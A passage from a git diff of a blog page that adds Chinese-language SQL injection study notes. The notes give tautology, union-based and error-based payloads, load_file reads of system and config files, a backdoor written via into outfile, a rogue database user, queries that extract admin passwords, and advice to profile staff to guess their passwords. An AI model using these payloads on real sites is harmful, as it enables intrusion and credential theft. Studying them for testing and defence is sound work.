@@ -104,7 +104,486 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/11/01/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="clfpg8ztv0017vwv5b0zi7c73" data-title="信息收集" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/11/01/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cljuunh6l0014g8v5302p2qsv" data-title="信息收集" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-SQLInject" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/01/SQLInject/" class="article-date">
+  <time class="dt-published" datetime="2021-10-31T16:00:00.000Z" itemprop="datePublished">2021-11-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/11/01/SQLInject/">SQL注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="/2021/11/01/SQLInject/SQLInject.png" alt="SQLInject"></p>
+<h2 id="sql注入介绍"><a href="#sql注入介绍" class="headerlink" title="sql注入介绍"></a>sql注入介绍</h2><p>传入非加密数据的地方可能存在注入点</p>
+<p>什么是SQL注入</p>
+<ul>
+<li>sql注入也是正常的web端口访问</li>
+<li>只是转入的参数值并非程序设计者所希望的，而是传入了嵌套SQL代码的参数值</li>
+<li>参数值利用程序处理注入者的逻辑，按注入者的期望执行数据库查询</li>
+<li>甚至页面呈现按SQL注入者期望的显示</li>
+<li><strong>通过应用程序把带有SQL代码的参数传递给数据库引擎</strong></li>
+</ul>
+<p>SQL注入漏洞的根本原因</p>
+<ul>
+<li>应用程序的问题而不是系统和数据库的问题</li>
+</ul>
+<h2 id="sql基础ddl语句"><a href="#sql基础ddl语句" class="headerlink" title="sql基础ddl语句"></a>sql基础ddl语句</h2><p>DDL：数据定义语言</p>
+<p>DML：数据操作语言</p>
+<p>DCL：数据控制语言</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show databases</span><br><span class="line">显示所有数据库</span><br><span class="line"></span><br><span class="line">DDL的主要命令</span><br><span class="line">create</span><br><span class="line">alter</span><br><span class="line">drop</span><br></pre></td></tr></table></figure>
+
+<h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><p>对表、视图等对象进行查询、插入、更新和删除操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">select、insert、update、delete</span><br><span class="line"></span><br><span class="line">insert into user() value()</span><br><span class="line">insert into user() select</span><br><span class="line">insert into user set id=1</span><br><span class="line"></span><br><span class="line">insert 报错逻辑</span><br><span class="line">insert 后门逻辑</span><br><span class="line"></span><br><span class="line">注入逻辑 or</span><br><span class="line">name=&#x27;&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">update user set name=&quot;&quot; where uid=1</span><br><span class="line"></span><br><span class="line">select order by (name,3)</span><br><span class="line">select where in (select)</span><br><span class="line">select where exists (select)</span><br><span class="line">select a.name,b.uid from table1 a,table2 b</span><br><span class="line">left join 左连接，返回所有符合左表条件的数据和右表匹配的数据</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>报错</p>
+<ul>
+<li>语法报错</li>
+<li>注入字符报错</li>
+</ul>
+<p>注入逻辑</p>
+<ul>
+<li><p>空集逻辑：网页不报错，但页面没有内容</p>
+</li>
+<li><p>全集逻辑：网页不报错，但显示页面正常或者页面更多</p>
+</li>
+</ul>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>记录联合（并集）union，union all</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user1UNION select * from user2</span><br><span class="line"></span><br><span class="line">select * from user1 UNION ALL select * from user2</span><br></pre></td></tr></table></figure>
+
+<p>联合记录的注入报错逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当第二部分字段数不符合时，网页报错或显示不正常</span><br><span class="line">当第二部分字段数符合时，网页显示正常</span><br><span class="line"></span><br><span class="line">在能够正常显示的情况下，当第一部分逻辑正常时，会正常显示，而当第一部分逻辑为假时，则会替代的显示第二部分的数据</span><br></pre></td></tr></table></figure>
+
+<h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><p>数据控制语言：管理员来管理权限使用的</p>
+<p>grant 权限 on 数据库.表 to 用户名 identified by 密码</p>
+<h2 id="数值类型与注入逻辑"><a href="#数值类型与注入逻辑" class="headerlink" title="数值类型与注入逻辑"></a>数值类型与注入逻辑</h2><p>数值类型分类：</p>
+<p>整数：tinyint，smallint</p>
+<p>mediuint，int，bigint</p>
+<p>浮点数：float，decimal，double</p>
+<h4 id="数值越界"><a href="#数值越界" class="headerlink" title="数值越界"></a>数值越界</h4><p><img src="/2021/11/01/SQLInject/2-1%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_397.jpg" alt="2-1数值类型基础与注入基础.pcwl_视频截图_397"></p>
+<p>类型转换报错</p>
+<p><img src="/2021/11/01/SQLInject/2-1%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_489.jpg" alt="2-1数值类型基础与注入基础.pcwl_视频截图_489"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">全集逻辑：</span><br><span class="line">or --+2=--！！！2</span><br><span class="line">or 1=1</span><br><span class="line">空集逻辑</span><br><span class="line">and ！！！2=~2</span><br><span class="line">and 1=2</span><br></pre></td></tr></table></figure>
+
+<h2 id="日期事件类型"><a href="#日期事件类型" class="headerlink" title="日期事件类型"></a>日期事件类型</h2><p>date、datetime、timestamp、time、year</p>
+<h2 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h2><p>char、varchar、binary、varbinary、blob、text、enum、set</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">保存少量字符串</span><br><span class="line">char固定长度字符串</span><br><span class="line">varchar可变长度字符串</span><br><span class="line"></span><br><span class="line">保存二进制字符串</span><br><span class="line">binary固定长度二进制字符串</span><br><span class="line">varbinary可变长度二进制字符串</span><br></pre></td></tr></table></figure>
+
+<h4 id="越界报错"><a href="#越界报错" class="headerlink" title="越界报错"></a>越界报错</h4><p>越界报错目标是得到字段名，进而推测字段名含义与表的功能</p>
+<h4 id="类型转换错误"><a href="#类型转换错误" class="headerlink" title="类型转换错误"></a>类型转换错误</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from users where uname=&#x27;&#x27;-&#x27;&#x27;;</span><br><span class="line">显示全集</span><br><span class="line"></span><br><span class="line">select * from users where !!uname=&#x27;admin&#x27;;</span><br><span class="line">显示警告，爆出字段名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Text 保存较大的文本</span><br><span class="line">Blob 保存较大的二进制数据</span><br><span class="line"></span><br><span class="line">text类型最大的应用是保留后门脚本注入到web服务器中</span><br><span class="line"></span><br><span class="line">enum 只能选择一个表格规定的元素</span><br><span class="line">set  只能选择表格规定的元素，不限个数</span><br><span class="line"></span><br><span class="line">find_in_set（元素，列/集合）</span><br><span class="line">find_in_set(left(version()),&quot;a&quot;,&quot;b&quot;)=1</span><br></pre></td></tr></table></figure>
+
+<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">between</span><br><span class="line">in()</span><br><span class="line">not in()</span><br><span class="line">is null</span><br><span class="line">is not null</span><br><span class="line">like</span><br><span class="line">%任意字符</span><br></pre></td></tr></table></figure>
+
+<p>盲注</p>
+<p>length(user())&lt;15</p>
+<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">and</span><br><span class="line">or</span><br><span class="line">not</span><br><span class="line">xor</span><br><span class="line"></span><br><span class="line">不变逻辑</span><br><span class="line">and 1=1</span><br><span class="line">or 1=2</span><br><span class="line">&amp;&amp;！！！！！！！！1</span><br><span class="line">and password=&#x27;&#x27;=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">空集逻辑</span><br><span class="line">and 1=2</span><br><span class="line">and 0=true</span><br><span class="line">&amp;&amp;！1</span><br><span class="line"></span><br><span class="line">全集逻辑</span><br><span class="line">or 1=1</span><br><span class="line">or ！！！1</span><br><span class="line">or ！！！1=~~2</span><br><span class="line"></span><br><span class="line">password=&#x27;&#x27;=&#x27;&#x27;可以绕过密码验证</span><br></pre></td></tr></table></figure>
+
+<h2 id="字典元数据"><a href="#字典元数据" class="headerlink" title="字典元数据"></a>字典元数据</h2><ol>
+<li><p>sql注入提权后创建一个用户</p>
+<p>insert into mysql.user(user,host,password) values(‘admin’,’%’,password(‘abc’))</p>
+</li>
+<li><p>mysql主要保存了那些敏感信息表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户表user：保存主机，用户名，密码等重要信息</span><br><span class="line">数据库权限db：保存了对数据库级别的权限信息</span><br><span class="line">字段权限表columns_priv：保存了字段的详细权限分配信息</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如何获取所有的数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">select schema_name from information_schema.schemata;</span><br><span class="line">select distinct table_schema from information_schema.tables;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>information_schema</p>
+<p>保存了所有数据库相关的元数据信息，包括所有数据库，表和字段等字典元数据信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">表SCHEMATA：数据库相关的定义信息</span><br><span class="line">表TABLES：表定义属性的所有元数据信息</span><br><span class="line">表COLUMNS：所有数据库下的所有表的所有字段信息</span><br><span class="line">ROUTINES：存储过程或者函数信息</span><br><span class="line">VIEWS:视图信息</span><br><span class="line">TRIGGERS：触发器信息</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前数据库所有表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select database()可以查询当前的数据库名称</span><br><span class="line">select table_name from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得表的所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from columns where table_schema=database() and table_name=&#x27;users&#x27;;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="探子回报函数"><a href="#探子回报函数" class="headerlink" title="探子回报函数"></a>探子回报函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">显示登录用户和主机名</span><br><span class="line">select user();</span><br><span class="line">select current_user();</span><br><span class="line">select session_user();</span><br><span class="line"></span><br><span class="line">返回数据库当前版本</span><br><span class="line">select version()</span><br><span class="line"></span><br><span class="line">返回当前数据库</span><br><span class="line">select database()</span><br><span class="line"></span><br><span class="line">length()</span><br><span class="line">left(database(),1)</span><br><span class="line">substring(database(),1,1)</span><br><span class="line">position(&#x27;@&#x27; in user())</span><br><span class="line">locate(&#x27;@&#x27;,user())</span><br><span class="line"></span><br><span class="line">探子：测试程序是否同时对函数，子查询，括号等是否过滤</span><br><span class="line">user()、version()</span><br><span class="line">user()返回情况</span><br><span class="line">mysql返回root@localhost</span><br><span class="line">oracle返回sys</span><br><span class="line">sqlserver返回sa</span><br><span class="line">探子回报：程序对函数，括号()和子查询并未做过滤，可能可以执行函数，自查徐等复杂逻辑</span><br><span class="line">探子未回报，基本上说明注入攻击困难或注入可能性小</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/SQLInject/2-7%E6%8E%A2%E5%AD%90%E5%9B%9E%E6%8A%A5%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E5%BA%94%E7%94%A8.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_864.jpg" alt="2-7探子回报函数以及应用.pcwl_视频截图_864"></p>
+<h2 id="时间窃取函数"><a href="#时间窃取函数" class="headerlink" title="时间窃取函数"></a>时间窃取函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/SQLInject/image-20211104164830592.png" alt="image-20211104164830592"></p>
+<blockquote>
+<p>虽然只睡眠1秒，但是有5条记录，每条睡一秒，一共睡5秒</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">相关函数</span><br><span class="line">select sleep(1):睡眠1秒</span><br><span class="line">select left(user(),1)：获得user（）最左边1位</span><br><span class="line">substring()获得字符串任意位置的任意个字符</span><br><span class="line">benchmark()：对运算执行压力测试</span><br><span class="line">if(条件，真执行，假执行)</span><br></pre></td></tr></table></figure>
+
+<h2 id="自报家底相关函数"><a href="#自报家底相关函数" class="headerlink" title="自报家底相关函数"></a>自报家底相关函数</h2><p>没有错误也要制造错误，并把查询的信息用错误带出来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">group_concat()   将所有查询数据用，拼接起来</span><br><span class="line"></span><br><span class="line">相关函数：if(),rand(),floor(),ifnull(),concat(),group_concat()</span><br><span class="line"></span><br><span class="line">group by 分组</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(user(),floor(rand()*2)) as a from users group by a;</span><br><span class="line">正常group by 是不会报错的</span><br><span class="line">但是由于rand随机函数，在0,0,1,0,0的情况下，由于两组分开会报错</span><br><span class="line">group by 会将分组键当作主键，主键不能重复冲突</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
+<li><p>确认目标网站</p>
+</li>
+<li><p>信息收集、分析与提取</p>
+</li>
+<li><p>网站技术分析：寻找和测试可用注入点，网页输入输出机制分析</p>
+</li>
+<li><p>探子回报：注入sql确定数据库类型，当前账户权限级别</p>
+</li>
+<li><p>提权分析：根据用户级别确定是否可以与系统层交互提权，是否可以与数据库层交互提权，是否可以获取web后台管理员权限的可能性</p>
+</li>
+<li><p>网站可用sql注入测试类型，盲注？显注？</p>
+</li>
+<li><p>盲注策略：使用注入分析工具替代人工</p>
+<p>显注策略：第三者上位</p>
+</li>
+</ol>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ol>
+<li><p>没有无用的信息</p>
+</li>
+<li><p>一般信息收集、分析与提取</p>
+<ol>
+<li>域名信息</li>
+<li>域名信息的扩展信息，如注册人，公司，联系电话等信息收集</li>
+<li>网站所有工作人员的信息收集，比技术研发人员相关联系方式，qq、手机，博客，微博等。目标是获取相关人员对密码设置的习惯和规律</li>
+</ol>
+</li>
+<li><p>技术分析</p>
+<ol>
+<li>技术分析：一般信息关联的可能性，网页源代码分析，输入输出机制分析， 寻找和测试可用注入点</li>
+</ol>
+</li>
+</ol>
+<h4 id="网站技术分析"><a href="#网站技术分析" class="headerlink" title="网站技术分析"></a>网站技术分析</h4><ol>
+<li><p>注入点发现与测试</p>
+<ol>
+<li><p>常见注入点</p>
+<ol>
+<li>表单中的输入域</li>
+<li>URL的参数</li>
+<li>Cookie或者隐藏域</li>
+</ol>
+</li>
+<li><p>如何发现注入点</p>
+<ol>
+<li><p>表单中的输入域、cookie、隐藏域</p>
+<p>对输入输出机制进行分析、过滤、提取，并了解执行注入sql的可能机制，比如field，cookie，url参数的变量名是啥，如何传递给数据库引擎</p>
+</li>
+<li><p>URL参数</p>
+<p>字符类型参数：引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1  不变逻辑</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;2  空集逻辑</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1   全集逻辑</span><br></pre></td></tr></table></figure>
+
+<p>整数型草书</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=1		不变逻辑</span><br><span class="line">and 1=2		空集逻辑</span><br><span class="line">or 1=1		全集逻辑</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h4 id="探子回报"><a href="#探子回报" class="headerlink" title="探子回报"></a>探子回报</h4><ol>
+<li><p>探子回报应用</p>
+<ol>
+<li><p>数据类型确认</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据类型确认：version()</span><br><span class="line">网页注入测试：and substring(version(),1,1)=5</span><br><span class="line">返回正确说明：</span><br><span class="line">1.数据库为mysql</span><br><span class="line">2.对执行数据库函数未进行过滤</span><br><span class="line">3.对括号未过滤</span><br><span class="line">4.可能对子查询未过滤</span><br><span class="line">5.可注入复杂逻辑</span><br><span class="line">6.评估注入可进行的程度</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用户权限级别确认</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用户权限级别确认：user()</span><br><span class="line">网页注入测试：and (select length(user()) from mysql.user where user like &#x27;z%&#x27;)&gt;1</span><br><span class="line">返回正确说明：</span><br><span class="line">1.对mysql字典数据库有权限，否则无权限。</span><br><span class="line">如果无权限，在对密码获取受限，必须另想方法，如web网站后台管理员密码。</span><br><span class="line">2.如对mysql字典库无权限，则需要测试对information_schema字典库测试权限</span><br><span class="line">and (select count(*) from information_schema.tables where table_schema=databaase())&gt;1</span><br><span class="line">返回正确则说明，对information_schema字典库有权限，可以获取所有数据库、所有表、所有字典信息。对攻破web后台管理员权限有帮助</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h4 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h4><ol>
+<li><p>sql注入系统层交互提权</p>
+<ol>
+<li><p>与系统层交互的方式</p>
+<ol>
+<li>读和写磁盘文件</li>
+<li>直接执行命令</li>
+</ol>
+<p>与系统层交互提交，取决于mysql服务器进程以什么权限运行，程序连接的数据库账户以什么权限级别使用</p>
+</li>
+<li><p>读取文件</p>
+<ol>
+<li><p>读取&#x2F;etc&#x2F;password文件</p>
+<p>select load_fiel(‘&#x2F;etc&#x2F;password’)</p>
+<p>盲注时配合substring,char,ascii等</p>
+</li>
+<li><p>读取网站配置文件以获得用户名和密码信息</p>
+<p>select load_file(‘&#x2F;var&#x2F;www&#x2F;weba&#x2F;dbconfig.conf’)</p>
+</li>
+</ol>
+</li>
+<li><p>写入有数据库连接的留后门脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 1. select &#x27;&lt;scripts language=&quot;javascript&quot;&gt;gogogo&lt;/scripts&gt;&#x27; into outfile &#x27;/var/www/weba&#x27;;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>sql注入漏洞工具的使用</p>
+<ol>
+<li><p>sql漏洞检测工具</p>
+<ol>
+<li>替换人工办法自动检测有漏洞的URL	<code>Safe3 SQL Injector</code></li>
+<li>对指定的URL进行穷举可能的注入<code>sqlmap</code></li>
+</ol>
+</li>
+<li><p>Safe3 SQL Injector</p>
+<p>safe3 SQL Injector是一个最强大和最易使用的渗透测试工具,它可以自动检测和利用SαL注入漏洞和数据库服务器的过程中。<br>SQL<br>safe3 SQL Injector具备读取 MySQL、 Oracle、 Postgre SQL、SQL Server、 Access、 SQLite、 Firebird、 Sybase、SAP MaxDB等数据库的能力。同时支持向 My SQL、 SQL Server写入文件,以及 SQL Server和 Oracle中执行任意命令。Safe3SQL injector也支持支持基于eror- based、Unon- based和 blind time-based的注入攻击。</p>
+</li>
+<li><p>sqlmap</p>
+<p>对指定URL进行穷举检测</p>
+</li>
+</ol>
+</li>
+<li><p>攻破后台获取web管理员权限</p>
+<ol>
+<li><p>获取当前连接的所有数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(schema_name,char(10),&#x27;&#x27;,char(10),&#x27;&#x27;,char(10)) from information_schema.schemata limit 1,10 --</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得当前数据库的所有表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(table_schema,char(10),table_name,char(10),table_rows,char(10),table_comment) from information_schema.tables where table_schema=database() limit 1,10 --</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得web后台管理员密码可能所在的表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(table_schema,char(10),table_name,char(10),table_rows,char(10),table_comment) from information_schema.tables where table_schema=database() and table_name&gt;=&#x27;a&#x27; and table_name&lt;&#x27;b&#x27; limit 1,10 --</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(table_schema,char(10),table_name,char(10),table_rows,char(10),table_comment) from information_schema.tables where table_schema=database() and table_name like &#x27;%user%&#x27; limit 1,10 --</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得用户表的所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(table_schema,char(10),table_name,char(10),column_name,char(10),cplumn_comment) from information_schema.tables where table_schema=database() and table_name=&#x27;member&#x27; limit 1,10 --</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得web后台管理员的用户名、密码、邮箱等敏感信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5,6,7,8,9,concat(ifnull(&#x27;member_name&#x27;,&#x27;no_name&#x27;),char(10),ifnull(&#x27;mobile&#x27;,&#x27;no_mobile&#x27;),char(10),ifnull(&#x27;e_mail&#x27;,&#x27;no_email&#x27;),char(10),ifnull(&#x27;pwd&#x27;,&#x27;no_pwd&#x27;)) from information_schema.tables where table_schema=database() and table_name=&#x27;member&#x27; limit 1,10 --</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h4 id="网站可用sql注入测试类型"><a href="#网站可用sql注入测试类型" class="headerlink" title="网站可用sql注入测试类型"></a>网站可用sql注入测试类型</h4><ol>
+<li><p>攻击类型与攻击策略</p>
+<ol>
+<li><p>sql注入类型</p>
+<ol>
+<li>盲注：输出数据库的内容再网页中没有显示</li>
+<li>报错注：充分利用程序、数据库报错的帮助获得所有信息</li>
+<li>显注：注入查询语句的内容在网页中有显示</li>
+<li>其他：email、ftp、samba等协议</li>
+</ol>
+</li>
+<li><p>盲注</p>
+<ol>
+<li>在网页中没有找到或者暂时没有找到输出的地方</li>
+<li>确认输入变量可以执行逻辑判断，只得到对或错两种结果</li>
+<li>盲注困难，有时候需要借助工具进行盲注攻击，但花费时间较长，需要耐心</li>
+</ol>
+</li>
+<li><p>报错注</p>
+<p>充分利用数据库报错和程序报错所提供的信息，让数据库引擎和程序，暴露出所需要的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat((select (select (select schema_name from information_schema.schemata limit 0 ,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2)) x_col from information_schema.tables group by x_col</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>显注</p>
+<p>在网页中寻找注入点，把程序正常信息替换为注入者信息</p>
+<p>显注直接得到明文信息，不需要猜测，获得敏感信息容易和快速</p>
+</li>
+</ol>
+</li>
+<li><p>寻找显注注入点</p>
+<ol>
+<li><p>union寻找处理字段数和第三者上位点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8 --</span><br></pre></td></tr></table></figure>
+
+<p>意义：</p>
+<ol>
